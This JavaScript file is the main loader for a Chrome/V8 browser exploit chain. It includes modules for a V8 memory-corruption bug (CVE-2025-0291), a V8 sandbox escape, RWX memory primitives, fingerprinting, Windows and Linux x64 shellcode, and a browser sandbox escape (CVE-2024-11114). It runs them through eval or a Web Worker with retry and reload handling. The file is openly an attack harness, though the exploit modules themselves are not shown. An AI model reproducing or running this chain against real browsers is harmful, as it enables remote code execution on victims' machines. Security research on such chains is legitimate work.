// Exploit settings
let loglevel = 2;
let run_in_worker = false;


// Exploit chain
let main = async () => {
    log("[i] Current log level: " + loglevel);
    if (run_in_worker) log("[i] Running scripts in a Web Worker");

    await include("kit/common/convert.js");
    await include("kit/common/dom.js");
    await include("kit/common/stability.js");
    await include("kit/common/v8-utils.js");
    await include("kit/common/versions.js");
    await include("kit/common/wasm-module-builder.js");

    // Symbols for the exploit chain
    await include("vulns/symbols.js");

    await include("kit/fingerprint/d8.js");
    await include("kit/fingerprint/useragent.js");

    // Initial V8 memory corruption: CVE-2025-0291
    await include("vulns/memcor/CVE-2025-0291.js");

    await include("kit/v8/cage.js");

    // V8 sandbox escape: issue 379140430 (+ leak a pointer to the trusted cage)
    await include("vulns/v8sbx/379140430.js");

    await include("kit/v8/memory.js");

    await include("kit/v8/rwx/egghunt.js");
    await include("kit/v8/rwx/isolate.js");
    await include("kit/v8/rwx/partitionalloc.js");
    await include("kit/v8/rwx/wasmrwx.js");
    await include("kit/v8/rwx.js");

    await include("kit/shellcodes/x64.js");
    await include("kit/shellcodes/x64-win.js");
    await include("kit/shellcodes/x64-linux.js");

    await include("kit/fingerprint/win.js");
    await include("kit/fingerprint/linux.js");

    // MojoJS is not required for this exploit chain
    /* await include("kit/renderer/mojo.js"); */

    // If the sandbox is disabled, open a calculator
    // Else, sandbox escape: CVE-2024-11114
    await include("vulns/path_finder.js");
    // Sandbox escape not needed for Linux
}


// Logging
function log(msg, level=0) {
    if (level <= loglevel) {
        console.log("\t".repeat((level >= 0) ? level : 0) + msg);
    }
}


// Load a script & run it in the global scope or in a dedicated Web Worker
// Script's completion value may be a Promise which will be awaited
// Require read() to be implemented
let include, worker, worker_eval;
var [RETRY, RELOAD, clean] = [0, false, () => {}];
{
    // Evaluate scripts in the global scope
    let evaluate = async (script) => {
        await eval?.(script);
    }

    // Setup a Web Worker & evaluate scripts within it
    let worker_code = () => {
        [RETRY, RELOAD, clean] = [0, false, () => {}];
        log = (msg, level=0) => postMessage({"type": "log", "msg": msg, "level": level});
        onmessage = async (e) => {
            try {
                [RETRY, RELOAD] = [0, false];
                await eval?.(e.data);
                postMessage({"type": "done"});
            } catch (err) {
                postMessage({"type": "error", "error": err, "retry": RETRY, "reload": RELOAD});
            }
        };
    }
    let worker_code_str = `(${worker_code})();`;

    if (typeof Blob === "undefined") {  // d8 does not support Blob but allow "string" type
        worker = new Worker(worker_code_str, {type: "string"});
    } else {
        let blob = new Blob([worker_code_str], {type: "application/javascript"});
        worker = new Worker(URL.createObjectURL(blob));
    }

    let currentResolve = log;
    let currentReject = log;
    worker.onmessage = (e) => {
        if (e.data.type === "log") log(e.data.msg, e.data.level);
        else if (e.data.type === "done") currentResolve();
        else if (e.data.type === "error") {
            [RETRY, RELOAD] = [e.data.retry, e.data.reload];
            currentReject(e.data.error);
        }
    }
    worker.onerror = (e) => {
        currentReject(e);
    }

    worker_eval = (script) => {
        return new Promise((resolve, reject) => {
            currentResolve = resolve;
            currentReject = reject;
            worker.postMessage(script);
        });
    }

    // Run/retry included scripts
    let run = async (script, trycount=1) => {
        [RETRY, RELOAD] = [0, false];           // reset RETRY & RELOAD to defaults for the new script
        script = `/*${Date.now()}*/` + script;  // timestamp to prevent caching issues

        try {
            if (run_in_worker && typeof worker !== "undefined") await worker_eval(script);
            else await evaluate(script);
        } catch (error) {
            let msg = error.message ? error.message : error;
            msg += (RETRY > 0) ? (` [${trycount}/${RETRY}` + ((trycount >= RETRY && RELOAD) ? " -> reload" : "") + "]") : "";

            if (trycount < RETRY) {
                log(msg, 1);
                await run(script, trycount+1);
            } else {
                if (msg.startsWith("[-] ")) msg = msg.slice(4);
                throw `[!] ${msg}`;
            }
        }
    }

    // Load a script
    let code = "";
    include = async (path, run_now=true) => {
        code += `log("[i] Loading ${path}", 0);`
                + await read(path)
                + ((run_now && !code) ? `//# sourceURL=${path}` : "");  // automatic sourcemaps if available
        if (run_now) {
            await run(code);
            code = "";
        }
    }
}


// Exit after the exploit completes
// Or reload to try the exploit again
let exit = async () => {
    await clean();
    if (typeof worker !== "undefined") {
        await worker_eval("clean()");
        worker.terminate();
    }

    if (RELOAD) {
        log("[i] Reloading the exploit");
        if (typeof(window) !== "undefined") { window.location.reload(); }
    }

    else {
        log("[i] Exploit chain done, exit cleanly");
        if (typeof(window) !== "undefined") { window.location.replace("https://0.0.0.0:0/"); }
    }
}


// Run the exploit chain
main().catch((err) => log(err.message ? err.message : err, -1)).finally(exit);
